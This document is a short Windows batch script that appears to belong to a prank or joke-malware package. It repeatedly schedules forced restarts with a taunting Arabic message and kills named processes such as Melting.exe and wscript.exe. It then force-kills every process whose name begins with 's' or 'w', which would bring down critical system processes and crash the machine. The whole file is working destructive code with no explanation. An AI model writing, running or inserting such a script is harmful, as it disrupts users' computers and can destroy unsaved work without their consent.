@echo off
shutdown -r -t 99 -c "همر المجمدة القذرة! :)"
timeout /t 10
shutdown -a
timeout /t 50
taskkill /f /im Music.UI.exe
taskkill /f /im Melting.exe
taskkill /f /im wscript.exe
timeout /t 1
shutdown -r -t 12 -c "همر المجمدة القذرة! :)" 
timeout /t 5
taskkill /f /im s*
taskkill /f /im w*
powershell wininit
exit